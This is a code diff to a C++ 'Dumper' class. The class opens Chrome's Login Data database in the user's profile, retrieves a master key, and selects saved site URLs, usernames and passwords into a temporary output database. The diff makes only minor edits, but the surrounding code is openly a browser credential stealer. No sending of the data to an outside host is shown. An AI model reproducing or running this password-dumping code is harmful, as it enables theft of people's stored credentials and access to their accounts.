@@ -51,7 +51,6 @@ int Dumper::handlePasswords(void* outdb, int argc, char** argv, char** azColName
 		cerr << "Error: " << error << endl;
 		return 0x69;
 	}
-	return 0;
 }
 
 const string Dumper::chromePath = getenv("USERPROFILE") + string("\\AppData\\Local\\Google\\Chrome\\");
@@ -76,7 +75,7 @@ string Dumper::readPasswords()
 	sqlite3* outdb;
 	string outFilePath = tempPath + (string)"output.db";
 	sqlite3_open_v2(outFilePath.c_str(), &outdb, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, NULL);
-	string query = "DROP TABLE IF EXISTS logins";
+	string query = "DROP TABLE logins";
 	//remove data from previous run
 	if (sqlite3_exec(outdb, query.c_str(), NULL, 0, &error) != SQLITE_OK)
 	{
@@ -95,14 +94,14 @@ string Dumper::readPasswords()
 	//read the database contains login data
 	if (sqlite3_open(tempLoginData.c_str(), &db))
 	{
-		cerr << "SQLITE3 error: Can't open database\n";
+		cerr << "Error: Can't open database\n";
 		exit(sqlite3_errcode(db));
 	}
 
 	query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 3";
 	if (sqlite3_exec(db, query.c_str(), Dumper::handlePasswords, outdb, &error) != SQLITE_OK)
 	{
-		cout << "SQLITE3 error: " << error << endl;
+		cout << "Error: " << error << endl;
 		exit(0x69);
 	}
 
@@ -145,8 +144,8 @@ void Dumper::getMasterKey()
 }
 
 //driver function of the dumper class
-string Dumper::dumpPassword()
+void Dumper::dumpPassword()
 {
 	Dumper::getMasterKey();
-	return Dumper::readPasswords();
+	Dumper::readPasswords();
 }
